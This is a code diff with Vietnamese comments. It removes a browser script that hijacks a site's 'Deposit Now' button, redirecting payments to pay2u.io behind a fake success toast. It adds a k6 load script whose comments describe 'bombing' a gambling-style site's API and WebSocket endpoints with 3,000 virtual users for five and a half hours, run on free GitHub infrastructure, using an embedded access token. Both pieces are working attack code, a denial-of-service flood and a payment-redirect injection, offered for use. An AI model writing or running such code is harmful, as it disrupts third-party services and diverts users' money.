@@ -1,43 +1,36 @@
-(function() {
-    // 1. Tạo nội dung chuyển khoản ngẫu nhiên từ 7 đến 10 ký tự
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const length = Math.floor(Math.random() * 4) + 7; 
-    let memo = '';
-    for (let i = 0; i < length; i++) {
-        memo += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
+import http from 'k6/http';
+import { check, sleep } from 'k6';
 
-    // 2. Đường dẫn trang nạp tiền mục tiêu của bạn
-    // Sửa lỗi: thay khoảng trắng bằng dấu hỏi để bắt đầu query string và mã hóa memo
-    const finalUrl = `https://pay2u.io?THE_TRONG&memo=${encodeURIComponent(memo)}`;
+export const options = {
+  scenarios: {
+    github_peak_flood: {
+      executor: 'constant-vus',
+      vus: 3000,                // Duy trì liên tục khóa cứng 3.000 người dùng ảo
+      duration: '5h30m',        // Chạy tối đa 5 tiếng 30 phút để an toàn trên hạ tầng GitHub Free
+    },
+  },
+};
 
-    function init() {
-        // 3. Tạo và hiển thị thông báo đen "cài lệnh thành công" giống hệt ảnh mẫu
-        const toast = document.createElement('div');
-        toast.setAttribute('role', 'status');
-        toast.setAttribute('aria-live', 'polite');
-        toast.style.cssText = "position:fixed;bottom:30%;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#fff;padding:12px 24px;border-radius:20px;font-size:15px;z-index:999999;box-shadow:0 2px 10px rgba(0,0,0,0.3);font-family:Arial,Helvetica,sans-serif;text-align:center;";
-        toast.innerHTML = "cài lệnh thành công";
-        document.body.appendChild(toast);
+// Chuỗi Token mới nhất lấy từ link Jackpot của bạn
+const TOKEN = '05%2F7JlwSPGyw9zyLckWuhme1c4JqGT6pX1uSy1Ld66Ks0lsEnAmzaCPfHRaGMMhBj60RAomzqNVXQVdkJ%2FvGpaVowpSvKddd%2BBH0saRmaSfpII9yKGTouYzJkIX3r5OeMYWNimHnDfCophfzoCZZd634dab%2FvlFiVoMR3hDON8eKj8IAj3saw11dQOTZtiWa2pIyfnvizdXa3ZMpzjvZQZ4MZdYtJ5Kv%2FTR62yUfVNfAKuz6sPgOP7c6YndWVNK1nBOWGeV3QeGFde7BYqF4jjKnXMM%2BTde79%2FcNnVPSVQyOthFft6QiJOs75gGveb8oVN23gAVXLf%2B8WMun5ZmkQQ%3D%3D.79d5031f8b5c0a7602fef3a2fb61859e40f8aa46a81495dcfa50f8ebe04e280b';
 
-        // Giữ thông báo hiển thị cố định trong 5 phút (300.000 ms)
-        setTimeout(() => { toast.remove(); }, 300000);
+export default function () {
+  try {
+    // 1. Dội bom yêu cầu vào HTTP API chính
+    const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
+    check(res1, { 'API OK': (r) => r.status === 200 || r.status === 401 });
 
-        // 4. Lắng nghe sự kiện click: Khi người dùng bấm nút "Nạp Tiền Ngay" mới bắt đầu chuyển hướng
-        const btn = document.querySelector("#depositSubmitClick");
-        if (btn) {
-            btn.addEventListener('click', (e) => {
-                e.preventDefault();
-                // chuyển hướng đến finalUrl
-                window.location.href = finalUrl;
-            });
-        }
-    }
+    // 2. Dội bom yêu cầu vào cổng bắt tay WebSocket mới
+    const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
+    check(res2, { 'New Hub OK': (r) => r.status !== 0 });
 
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
-    } else {
-        init();
-    }
-
-})();
+    // 3. Dội bom yêu cầu vào cổng bắt tay WebSocket cũ
+    const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
+    check(res3, { 'Old Hub OK': (r) => r.status !== 0 });
+  } catch (err) {
+    // Tự động nuốt lỗi mạng cục bộ để tiến trình k6 không bị dừng ngắt quãng
+  }
+  
+  // Thời gian giãn cách siêu nhỏ (0.05 giây) nhằm đẩy tần suất request lên mức cao nhất
+  sleep(0.05); 
+}
